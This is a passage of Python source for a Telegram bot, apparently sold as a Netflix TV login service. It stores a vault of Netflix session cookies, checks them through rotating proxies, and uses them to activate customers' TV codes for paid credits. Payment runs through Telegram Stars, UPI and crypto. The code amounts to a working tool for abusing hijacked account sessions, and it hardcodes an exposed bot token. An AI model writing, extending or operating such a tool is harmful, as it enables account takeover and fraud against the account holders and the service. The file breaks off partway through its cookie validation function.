#!/usr/bin/env python3
"""
Netflix TV Login Bot — Final Edition v4.0
Redesigned UI with small-caps fonts, user cookie vault, language toggle,
history pagination, stats, full admin dashboard, subscription plans.
"""

import asyncio
import io
import json
import os
import random
import re
import sqlite3
import sys
import threading
import time
import urllib.parse
import zipfile
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice,
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, PreCheckoutQueryHandler,
    filters, ContextTypes,
)
from telegram.constants import ParseMode

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN        = "8834589135:AAF20dbfsxvDZOBL3N1t87NZafIkgEl9lpw"
ADMIN_IDS        = [6824677136, 8033719088]
SUPPORT_USERNAME = "sagarkun0"
CHANNEL_USERNAME = "foryoubysagar"

PROXY_FILE              = "proxy.txt"
DB_FILE                 = "nfbot.db"
REQUEST_TIMEOUT         = 15
MAX_CREDITS             = 3
CREDIT_RESET_HRS        = 12
MAX_COOKIE_ATTEMPTS     = 60
MAX_USER_COOKIES        = 5
VAULT_LOW_THRESHOLD     = 10
COOKIE_VALIDATION_HRS   = 4
COOKIE_VALIDATION_BATCH = 50
HISTORY_PAGE_SIZE       = 5

UPI_ID           = "yourname@upi"
CRYPTO_USDT_ADDR = "YOUR_USDT_TRC20_ADDRESS"
CRYPTO_BTC_ADDR  = "YOUR_BTC_ADDRESS"

PLANS = {
    "plan_10cr": {
        "label": "10 Credits", "credits": 10, "unlimited_days": 0,
        "stars": 10, "inr": 10, "usd_cents": 15,
        "desc": "10 login credits (no expiry)",
    },
    "plan_unlimited": {
        "label": "Unlimited Plan", "credits": 0, "unlimited_days": 30,
        "stars": 300, "inr": 250, "usd_cents": 350,
        "desc": "Unlimited logins for 30 days",
    },
}

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES  = {n.lower(): n for n in ALL_COOKIE_NAMES}

# ── States ────────────────────────────────────────────────────────────
ST_TV_FREE      = "tv_free"
ST_TV_OWN       = "tv_own"
ST_COOKIE_TXT   = "cookie_txt"
ST_COOKIE_ZIP   = "cookie_zip"

# ── Runtime ───────────────────────────────────────────────────────────
cookie_lock       = threading.Lock()
stats_lock        = threading.Lock()
active_lock       = threading.Lock()
proxy_lock        = threading.Lock()
active_users      = {}
_live_proxies     = []
_low_vault_alerted = False

rt_stats = {
    "total_logins": 0, "successful": 0, "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

# ══════════════════════════════════════════════════════════════════════
#  COUNTRY FLAGS
# ══════════════════════════════════════════════════════════════════════
COUNTRY_FLAGS = {
    "IN":"🇮🇳","US":"🇺🇸","GB":"🇬🇧","UK":"🇬🇧","CA":"🇨🇦",
    "AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷","JP":"🇯🇵","BR":"🇧🇷",
    "MX":"🇲🇽","IT":"🇮🇹","ES":"🇪🇸","KR":"🇰🇷","NL":"🇳🇱",
    "SG":"🇸🇬","ID":"🇮🇩","TH":"🇹🇭","PH":"🇵🇭","MY":"🇲🇾",
    "PK":"🇵🇰","BD":"🇧🇩","NP":"🇳🇵","LK":"🇱🇰","SA":"🇸🇦",
    "AE":"🇦🇪","TR":"🇹🇷","RU":"🇷🇺","PL":"🇵🇱","AR":"🇦🇷",
    "CL":"🇨🇱","CO":"🇨🇴","ZA":"🇿🇦","NG":"🇳🇬","EG":"🇪🇬",
    "PT":"🇵🇹","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮",
    "AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","GR":"🇬🇷","CZ":"🇨🇿",
    "HU":"🇭🇺","RO":"🇷🇴","UA":"🇺🇦","VN":"🇻🇳","TW":"🇹🇼",
    "HK":"🇭🇰","IL":"🇮🇱","QA":"🇶🇦","KW":"🇰🇼","OM":"🇴🇲",
}

def get_flag(code):
    return COUNTRY_FLAGS.get((code or "").upper().strip(), "")

# ══════════════════════════════════════════════════════════════════════
#  LANGUAGE STRINGS
# ══════════════════════════════════════════════════════════════════════
S = {
    "en": {
        "activate_method":
            "📺 ʜᴏᴡ ᴡᴏᴜʟᴅ ʏᴏᴜ ʟɪᴋᴇ ᴛᴏ ᴀᴄᴛɪᴠᴀᴛᴇ?\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴄʜᴏᴏꜱᴇ ʏᴏᴜʀ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ᴍᴇᴛʜᴏᴅ:",
        "free_activate_prompt":
            "⚡ ǫᴜɪᴄᴋ ᴛᴠ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📺 ᴇɴᴛᴇʀ ʏᴏᴜʀ 8-ᴅɪɢɪᴛ ɴᴇᴛғʟɪx ᴛᴠ ᴄᴏᴅᴇ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ ꜱᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛꜱ:\n"
            "- 1234-5678\n"
            "- 1234 5678\n"
            "- 12345678\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✨ ꜱɪᴛ ʙᴀᴄᴋ. ʀᴇʟᴀx. ꜱᴛʀᴇᴀᴍ ✨\n"
            "━━━━━━━━━━━━━━━━━━━━",
        "own_cookie_menu":
            "🔐 ᴀᴅᴅ ʏᴏᴜʀ ɴᴇᴛғʟɪx ᴄᴏᴏᴋɪᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴄʜᴏᴏꜱᴇ ʜᴏᴡ ᴛᴏ ꜱᴇɴᴅ ʏᴏᴜʀ ᴄᴏᴏᴋɪᴇ:\n\n"
            "📍 ꜱᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛꜱ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📄 ᴛxᴛ ғɪʟᴇ\n"
            "ꜱɪɴɢʟᴇ ᴄᴏᴏᴋɪᴇ ɪɴ ɴᴇᴛꜱᴄᴀᴘᴇ ғᴏʀᴍᴀᴛ\n\n"
            "📦 ᴢɪᴘ ғɪʟᴇ\n"
            "ᴍᴜʟᴛɪᴘʟᴇ ᴄᴏᴏᴋɪᴇ ғɪʟᴇꜱ (ᴍᴀx 5)\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ ᴍᴀx 5 ᴄᴏᴏᴋɪᴇꜱ ᴘᴇʀ ᴜꜱᴇʀ\n"
            "⚠️ ᴏɴʟʏ ɴᴇᴛꜱᴄᴀᴘᴇ ғᴏʀᴍᴀᴛ ᴀᴄᴄᴇᴘᴛᴇᴅ\n"
            "🔑 ꜱʟᴏᴛꜱ ᴜꜱᴇᴅ: {used}/5",
        "send_txt_prompt":
            "📄 ꜱᴇɴᴅ ʏᴏᴜʀ .ᴛxᴛ ғɪʟᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ɴᴇᴛꜱᴄᴀᴘᴇ\n"
            "ғᴏʀᴍᴀᴛ .ᴛxᴛ ғɪʟᴇ ɴᴏᴡ.",
        "send_zip_prompt":
            "📦 ꜱᴇɴᴅ ʏᴏᴜʀ .ᴢɪᴘ ғɪʟᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📋 ᴢɪᴘ ʀᴇǫᴜɪʀᴇᴍᴇɴᴛꜱ:\n"
            "- ᴇᴀᴄʜ .ᴛxᴛ ғɪʟᴇ = ᴏɴᴇ ᴄᴏᴏᴋɪᴇ\n"
            "- ᴍᴀx 5 .ᴛxᴛ ғɪʟᴇꜱ ᴏɴʟʏ\n"
            "- ᴇᴀᴄʜ ɪɴ ɴᴇᴛꜱᴄᴀᴘᴇ ғᴏʀᴍᴀᴛ",
        "own_cookie_prompt":
            "⚡ ɴᴏᴡ ᴇɴᴛᴇʀ ʏᴏᴜʀ 8-ᴅɪɢɪᴛ ᴛᴠ ᴄᴏᴅᴇ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ ꜱᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛꜱ:\n"
            "- 1234-5678  |  1234 5678  |  12345678",
        "no_credits":
            "⛔ ɴᴏ ᴄʀᴇᴅɪᴛꜱ ʟᴇғᴛ!\n\n"
            "⏰ Resets in: {reset}\n"
            "Credits refill every {hrs} hours.\n\n"
            "💎 Buy more credits below.",
        "vault_empty":
            "😔 ᴠᴀᴜʟᴛ ɪꜱ ᴇᴍᴘᴛʏ!\n\n"
            "No cookies available right now.\n"
            "Please try again later.",
        "cancelled": "❌ ᴄᴀɴᴄᴇʟʟᴇᴅ. Returning to menu.",
        "lang_menu":
            "🌐 ꜱᴇʟᴇᴄᴛ ʟᴀɴɢᴜᴀɢᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴄᴜʀʀᴇɴᴛ: 🇬🇧 English\n"
            "━━━━━━━━━━━━━━━━━━━━",
    },
    "hi": {
        "activate_method":
            "📺 ᴀᴘ ᴋᴀɪꜱᴇ ᴀᴄᴛɪᴠᴀᴛᴇ ᴋᴀʀɴᴀ ᴄʜᴀʜᴛᴇ ʜᴏ?\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴀᴘɴᴀ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ᴍᴇᴛʜᴏᴅ ᴄʜᴜɴᴏ:",
        "free_activate_prompt":
            "⚡ ꜰʀᴇᴇ ᴛᴠ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📺 ᴀᴘɴᴀ 8-ᴅɪɢɪᴛ ɴᴇᴛғʟɪx ᴛᴠ ᴄᴏᴅᴇ ʙᴇᴊʜᴏ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ ꜱᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛꜱ:\n"
            "- 1234-5678\n- 1234 5678\n- 12345678\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✨ ʀᴇʟᴀx ᴋᴀʀᴏ ᴀᴜʀ ꜱᴛʀᴇᴀᴍ ᴋᴀʀᴏ ✨\n"
            "━━━━━━━━━━━━━━━━━━━━",
        "own_cookie_menu":
            "🔐 ᴀᴘɴɪ ɴᴇᴛғʟɪx ᴄᴏᴏᴋɪᴇ ᴀᴅᴅ ᴋᴀʀᴏ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴄᴏᴏᴋɪᴇ ᴋᴀɪꜱᴇ ʙʜᴇᴊɴᴀ ʜᴀɪ ᴄʜᴜɴᴏ:\n\n"
            "📍 ꜱᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛꜱ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📄 .ᴛxᴛ ғɪʟᴇ — ꜱɪɴɢʟᴇ ᴄᴏᴏᴋɪᴇ\n"
            "📦 .ᴢɪᴘ ғɪʟᴇ — ᴍᴜʟᴛɪᴘʟᴇ ᴄᴏᴏᴋɪᴇꜱ\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ ᴍᴀx 5 ᴄᴏᴏᴋɪᴇꜱ ᴘᴇʀ ᴜꜱᴇʀ\n"
            "🔑 ꜱʟᴏᴛꜱ ᴜꜱᴇᴅ: {used}/5",
        "send_txt_prompt":
            "📄 ᴀᴘɴɪ .ᴛxᴛ ғɪʟᴇ ʙʜᴇᴊᴏ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴀʙ ᴀᴘɴɪ Netscape format .txt file bhejo.",
        "send_zip_prompt":
            "📦 ᴀᴘɴɪ .ᴢɪᴘ ғɪʟᴇ ʙʜᴇᴊᴏ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📋 Zip mein:\n"
            "- Har .txt file = ek cookie\n"
            "- Max 5 .txt files\n"
            "- Netscape format mein honi chahiye",
        "own_cookie_prompt":
            "⚡ ᴀʙ ᴀᴘɴᴀ 8-ᴅɪɢɪᴛ ᴛᴠ ᴄᴏᴅᴇ ʙʜᴇᴊᴏ:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Format: 1234-5678 | 1234 5678 | 12345678",
        "no_credits":
            "⛔ ᴄʀᴇᴅɪᴛꜱ ᴋʜᴀᴛᴀᴍ ʜᴏ ɢᴀʏᴇ!\n\n"
            "⏰ Reset hoga: {reset} mein\n"
            "Har {hrs} ghante mein credits refill hote hain.\n\n"
            "💎 Neeche se aur credits khareedo.",
        "vault_empty":
            "😔 ᴠᴀᴜʟᴛ ᴋʜᴀʟɪ ʜᴀɪ!\n\n"
            "Abhi koi cookies available nahi hain.\n"
            "Thodi der baad try karo.",
        "cancelled": "❌ ᴄᴀɴᴄᴇʟ ʜᴏ ɢᴀʏᴀ. Menu par wapas ja rahe hain.",
        "lang_menu":
            "🌐 ʙʜᴀꜱʜᴀ ᴄʜᴜɴᴏ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴄᴜʀʀᴇɴᴛ: 🇮🇳 Hinglish\n"
            "━━━━━━━━━━━━━━━━━━━━",
    },
}

def s(user_id, key, **kwargs):
    lang = get_user_lang(user_id)
    text = S.get(lang, S["en"]).get(key, S["en"].get(key, key))
    return text.format(**kwargs) if kwargs else text

# ══════════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════════
def init_db():
    con = sqlite3.connect(DB_FILE)
    con.executescript("""
        CREATE TABLE IF NOT EXISTS cookies (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            source       TEXT DEFAULT 'unknown',
            data         TEXT NOT NULL,
            added_at     INTEGER DEFAULT (strftime('%s','now')),
            alive        INTEGER DEFAULT 1,
            last_checked INTEGER DEFAULT 0,
            country      TEXT DEFAULT ''
        );
        CREATE INDEX IF NOT EXISTS idx_cookies_alive ON cookies(alive);

        CREATE TABLE IF NOT EXISTS user_cookies (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id  INTEGER NOT NULL,
            data     TEXT NOT NULL,
            filename TEXT DEFAULT '',
            added_at INTEGER DEFAULT (strftime('%s','now'))
        );
        CREATE INDEX IF NOT EXISTS idx_uc_user ON user_cookies(user_id);

        CREATE TABLE IF NOT EXISTS users (
            user_id           INTEGER PRIMARY KEY,
            first_name        TEXT DEFAULT '',
            username          TEXT DEFAULT '',
            credits_used      INTEGER DEFAULT 0,
            last_reset        INTEGER DEFAULT 0,
            total_logins      INTEGER DEFAULT 0,
            successful_logins INTEGER DEFAULT 0,
            bonus_credits     INTEGER DEFAULT 0,
            unlimited_until   INTEGER DEFAULT 0,
            banned            INTEGER DEFAULT 0,
            language          TEXT DEFAULT 'en',
            joined_at         INTEGER DEFAULT (strftime('%s','now'))
        );

        CREATE TABLE IF NOT EXISTS login_log (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id       INTEGER,
            tv_code       TEXT,
            success       INTEGER DEFAULT 0,
            cookie_source TEXT DEFAULT '',
            country       TEXT DEFAULT '',
            ts            INTEGER DEFAULT (strftime('%s','now'))
        );

        CREATE TABLE IF NOT EXISTS payments (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id  INTEGER,
            plan_key TEXT,
            method   TEXT,
            amount   TEXT,
            status   TEXT DEFAULT 'pending',
            ts       INTEGER DEFAULT (strftime('%s','now'))
        );
    """)
    con.commit()
    con.close()

def db():
    con = sqlite3.connect(DB_FILE, check_same_thread=False)
    con.row_factory = sqlite3.Row
    return con

# ── helpers ───────────────────────────────────────────────────────────
def ensure_user(user_id, first_name="", username=""):
    c = db()
    c.execute("INSERT OR IGNORE INTO users (user_id,first_name,username) VALUES (?,?,?)",
              (user_id, first_name, username))
    c.execute("UPDATE users SET first_name=?,username=? WHERE user_id=?",
              (first_name, username, user_id))
    c.commit(); c.close()

def get_user_row(user_id):
    c = db(); row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return dict(row) if row else {}

def get_user_lang(user_id):
    c = db(); row = c.execute("SELECT language FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return (row["language"] if row and row["language"] else "en")

def set_user_lang(user_id, lang):
    c = db(); c.execute("UPDATE users SET language=? WHERE user_id=?", (lang, user_id)); c.commit(); c.close()

def is_banned(user_id):
    c = db(); row = c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return bool(row and row["banned"])

def is_unlimited(user_id):
    c = db(); row = c.execute("SELECT unlimited_until FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return bool(row and row["unlimited_until"] and int(time.time()) < row["unlimited_until"])

def unlimited_expires(user_id):
    c = db(); row = c.execute("SELECT unlimited_until FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return row["unlimited_until"] if row else 0

# ── credits ───────────────────────────────────────────────────────────
def check_and_use_credit(user_id):
    if is_unlimited(user_id):
        return True, 9999, 0
    now = int(time.time()); span = CREDIT_RESET_HRS * 3600
    c = db()
    row = c.execute("SELECT credits_used,last_reset,bonus_credits FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row: c.close(); return False, 0, 0
    used, last_reset, bonus = row["credits_used"], row["last_reset"], row["bonus_credits"] or 0
    total_max = MAX_CREDITS + bonus
    if now - last_reset >= span:
        c.execute("UPDATE users SET credits_used=0,last_reset=? WHERE user_id=?", (now, user_id))
        c.commit(); used, last_reset = 0, now
    left = total_max - used
    if left <= 0: c.close(); return False, 0, span - (now - last_reset)
    c.execute("UPDATE users SET credits_used=credits_used+1,total_logins=total_logins+1 WHERE user_id=?", (user_id,))
    c.commit(); c.close()
    return True, left - 1, 0

def get_credits_status(user_id):
    if is_unlimited(user_id):
        exp = unlimited_expires(user_id)
        return 9999, max(0, exp - int(time.time())), True
    now = int(time.time()); span = CREDIT_RESET_HRS * 3600
    c = db()
    row = c.execute("SELECT credits_used,last_reset,bonus_credits FROM users WHERE user_id=?", (user_id,)).fetchone()
    c.close()
    if not row: return MAX_CREDITS, 0, False
    used, last_reset, bonus = row["credits_used"], row["last_reset"], row["bonus_credits"] or 0
    total_max = MAX_CREDITS + bonus
    if now - last_reset >= span: return total_max, 0, False
    return max(0, total_max - used), span - (now - last_reset), False

def refund_credit(user_id):
    if is_unlimited(user_id): return
    c = db()
    c.execute("UPDATE users SET credits_used=MAX(0,credits_used-1),total_logins=MAX(0,total_logins-1) WHERE user_id=?", (user_id,))
    c.commit(); c.close()

def mark_successful_login(user_id):
    c = db(); c.execute("UPDATE users SET successful_logins=successful_logins+1 WHERE user_id=?", (user_id,)); c.commit(); c.close()

def get_user_success_count(user_id):
    c = db(); row = c.execute("SELECT successful_logins FROM users WHERE user_id=?", (user_id,)).fetchone(); c.close()
    return row["successful_logins"] if row else 0

def apply_plan(user_id, plan_key):
    plan = PLANS.get(plan_key)
    if not plan: return False, "Unknown plan."
    c = db()
    if plan["unlimited_days"] > 0:
        until = int(time.time()) + plan["unlimited_days"] * 86400
        c.execute("UPDATE users SET unlimited_until=? WHERE user_id=?", (until, user_id))
    else:
        c.execute("UPDATE users SET bonus_credits=bonus_credits+? WHERE user_id=?", (plan["credits"], user_id))
    c.commit(); c.close()
    return True, plan["desc"]

# ── admin vault ───────────────────────────────────────────────────────
def store_cookies_bulk(cookies_list, source="unknown"):
    if not cookies_list: return 0
    c = db(); cur = c.cursor(); added = 0
    for cdict in cookies_list:
        if "NetflixId" in cdict:
            cur.execute("INSERT INTO cookies (source,data) VALUES (?,?)", (source, json.dumps(cdict)))
            added += 1
    c.commit(); c.close(); return added

def count_vault():
    c = db(); row = c.execute("SELECT COUNT(*) AS n FROM cookies WHERE alive=1").fetchone(); c.close()
    return row["n"] if row else 0

def count_all_cookies():
    c = db()
    total = c.execute("SELECT COUNT(*) AS n FROM cookies").fetchone()["n"]
    alive = c.execute("SELECT COUNT(*) AS n FROM cookies WHERE alive=1").fetchone()["n"]
    dead  = c.execute("SELECT COUNT(*) AS n FROM cookies WHERE alive=0").fetchone()["n"]
    c.close(); return {"total": total, "alive": alive, "dead": dead}

def get_cookie_source_stats():
    c = db()
    rows = c.execute(
        "SELECT source, COUNT(*) AS n, SUM(CASE WHEN alive=1 THEN 1 ELSE 0 END) AS alive "
        "FROM cookies GROUP BY source ORDER BY n DESC LIMIT 10"
    ).fetchall(); c.close(); return [dict(r) for r in rows]

def get_cookie_country_stats():
    c = db()
    rows = c.execute(
        "SELECT country, COUNT(*) AS n FROM cookies WHERE country!='' "
        "GROUP BY country ORDER BY n DESC LIMIT 10"
    ).fetchall(); c.close(); return [dict(r) for r in rows]

def pop_validated_cookie():
    """Get a live admin vault cookie, validate it fresh, delete after use."""
    global _low_vault_alerted
    with cookie_lock:
        for _ in range(MAX_COOKIE_ATTEMPTS):
            c = db()
            row = c.execute("SELECT id,source,data FROM cookies WHERE alive=1 ORDER BY RANDOM() LIMIT 1").fetchone()
            if not row: c.close(); return None, None, {}
            cookie_id, source = row["id"], row["source"]
            try: cdict = json.loads(row["data"])
            except Exception:
                c.execute("DELETE FROM cookies WHERE id=?", (cookie_id,)); c.commit(); c.close(); continue
            proxy = _get_proxy()
            valid, info = validate_and_get_info(cdict, proxy)
            if valid:
                c.execute("DELETE FROM cookies WHERE id=?", (cookie_id,)); c.commit(); c.close()
                return source, cdict, info
            else:
                c.execute("DELETE FROM cookies WHERE id=?", (cookie_id,)); c.commit(); c.close()
        return None, None, {}

# ── user cookie vault ─────────────────────────────────────────────────
def count_user_cookies(user_id):
    c = db(); row = c.execute("SELECT COUNT(*) AS n FROM user_cookies WHERE user_id=?", (user_id,)).fetchone()
    c.close(); return row["n"] if row else 0

def store_user_cookies(user_id, cookies_list, filename=""):
    """Store cookies for a specific user (max MAX_USER_COOKIES total)."""
    existing = count_user_cookies(user_id)
    slots_free = MAX_USER_COOKIES - existing
    if slots_free <= 0: return 0
    cookies_list = cookies_list[:slots_free]
    c = db(); added = 0
    for cdict in cookies_list:
        if "NetflixId" in cdict:
            c.execute("INSERT INTO user_cookies (user_id,data,filename) VALUES (?,?,?)",
                      (user_id, json.dumps(cdict), filename))
            added += 1
    c.commit(); c.close(); return added

def pop_user_cookie(user_id):
    """Get and delete a random user cookie."""
    c = db()
    row = c.execute("SELECT id,data FROM user_cookies WHERE user_id=? ORDER BY RANDOM() LIMIT 1", (user_id,)).fetchone()
    if not row: c.close(); return None, {}
    c.execute("DELETE FROM user_cookies WHERE id=?", (row["id"],)); c.commit(); c.close()
    try: return "own", json.loads(row["data"])
    except Exception: return None, {}

# ══════════════════════════════════════════════════════════════════════
#  PROXY MANAGEMENT
# ══════════════════════════════════════════════════════════════════════
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line, re.IGNORECASE,
    )
    if m:
        d = m.groupdict(); h = d["host"].strip("[]")
        url = (f"{d['scheme']}://{d['user']}:{d['password']}@{h}:{d['port']}"
               if d.get("user") else f"{d['scheme']}://{h}:{d['port']}")
        return {"http": url, "https": url, "_url": url}
    parts = line.split(":")
    if len(parts) == 4:
        a, b, cc, dd = parts
        if b.isdigit():
            url = f"http://{cc}:{dd}@{a}:{b}"; return {"http": url, "https": url, "_url": url}
        if dd.isdigit():
            url = f"http://{a}:{b}@{cc}:{dd}"; return {"http": url, "https": url, "_url": url}
    m = re.match(r"^([^:\s]+):(\d+)$", line)
    if m:
        url = f"http://{m.group(1)}:{m.group(2)}"; return {"http": url, "https": url, "_url": url}
    return None

def _test_proxy(proxy):
    try:
        r = requests.get("https://www.netflix.com/robots.txt",
                         proxies={"http": proxy["http"], "https": proxy["https"]},
                         timeout=8, verify=False)
        return r.status_code < 500
    except Exception: return False

def load_and_test_proxies():
    global _live_proxies
    if not os.path.exists(PROXY_FILE):
        print("  [Proxy] No proxy.txt — running without proxies."); return
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        raw = [p for p in (parse_proxy_line(l) for l in f) if p]
    if not raw: print("  [Proxy] proxy.txt is empty."); return
    print(f"  [Proxy] Testing {len(raw)} proxies...")
    alive = [p for p in raw if _test_proxy(p)]
    with proxy_lock: _live_proxies = alive
    print(f"  [Proxy] {len(alive)}/{len(raw)} alive.")

def _get_proxy():
    with proxy_lock:
        return random.choice(_live_proxies) if _live_proxies else None

def _mark_proxy_dead(proxy):
    if not proxy: return
    url = proxy.get("_url", proxy.get("http", ""))
    with proxy_lock:
        _live_proxies[:] = [p for p in _live_proxies if p.get("_url", p.get("http")) != url]

# ══════════════════════════════════════════════════════════════════════
#  COOKIE EXTRACTION
# ══════════════════════════════════════════════════════════════════════
def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return (canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower())

def _entries_to_dict(entries):
    cookies = {}
    for e in entries:
        if e["name"] not in cookies: cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None

def _parse_netscape_block(text):
    entries = []
    for line in text.splitlines():
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) < 7: parts = re.split(r"\s+", line, maxsplit=6)
        if len(parts) < 7: continue
        if parts[1].upper() not in ("TRUE","FALSE"): continue
        if parts[3].upper() not in ("TRUE","FALSE"): continue
        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()): continue
        name = canonicalize_name(parts[5])
        if not is_netflix_cookie(parts[0], name): continue
        entries.append({"name": name, "value": parts[6].strip()})
    return entries

def _parse_raw_block(text):
    pat = re.compile(
        r"(?:['\"])?(?P<name>" + "|".join(sorted(ALL_COOKIE_NAMES, key=len, reverse=True)) +
        r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for m in pat.finditer(text):
        entries.append({"name": canonicalize_name(m.group("name")),
                        "value": m.group("value").strip("'\"").rstrip(",")})
    return _entries_to_dict(entries) if entries else None

def _parse_json_content(text):
    try: data = json.loads(text)
    except Exception: return []
    results = []
    if isinstance(data, list) and data and isinstance(data[0], list):
        for block in data:
            entries = [{"name": canonicalize_name(c.get("name","")), "value": c.get("value","")}
                       for c in block if isinstance(c,dict) and is_netflix_cookie(c.get("domain",""),c.get("name",""))]
            d = _entries_to_dict(entries)
            if d: results.append(d)
        return results
    if isinstance(data, list):
        entries = [{"name": canonicalize_name(c.get("name","")), "value": c.get("value","")}
                   for c in data if isinstance(c,dict) and is_netflix_cookie(c.get("domain",""),c.get("name",""))]
        d = _entries_to_dict(entries); return [d] if d else []
    if isinstance(data, dict):
        sub = data.get("cookies") or data.get("items") or [data]
        entries = [{"name": canonicalize_name(c.get("name","")), "value": c.get("value","")}
                   for c in sub if isinstance(c,dict) and is_netflix_cookie(c.get("domain",""),c.get("name",""))]
        d = _entries_to_dict(entries); return [d] if d else []
    return []

_BLOCK_SEP = re.compile(
    r"(?:={5,}|-{5,}|#{5,}|# Netscape HTTP Cookie File"
    r"|\[Account[ _]?\d+\]|# Account[ _]?\d+|# Cookie[ _]?\d+|# User[ _]?\d+)",
    re.IGNORECASE)

def extract_all_cookies_from_content(content):
    json_result = _parse_json_content(content)
    if json_result: return json_result
    results = []
    for block in _BLOCK_SEP.split(content):
        block = block.strip()
        if not block: continue
        entries = _parse_netscape_block(block); d = _entries_to_dict(entries)
        if d: results.append(d)
        else:
            d = _parse_raw_block(block)
            if d: results.append(d)
    if not results:
        entries = _parse_netscape_block(content); d = _entries_to_dict(entries)
        if d: results.append(d)
        else:
            d = _parse_raw_block(content)
            if d: results.append(d)
    return results

# ══════════════════════════════════════════════════════════════════════
#  NETFLIX VALIDATION & TV LOGIN
# ══════════════════════════════════════════════════════════════════════
def _re_get(patterns, text, default="Unknown"):
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            v = m.group(1).strip(); return v if v else default
    return default

def validate_and_get_info(cookies, proxy=None):
    session = requests.Session(); session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html,*/*", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get("https://www.netflix.com/account/membership",
                        headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            if proxy: _mark_proxy_dead(proxy)
            return False, {}
        t = r.text
        info = {
            "country":        _re_get([r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup"\s*:\s*"([^"]+)"'], t),
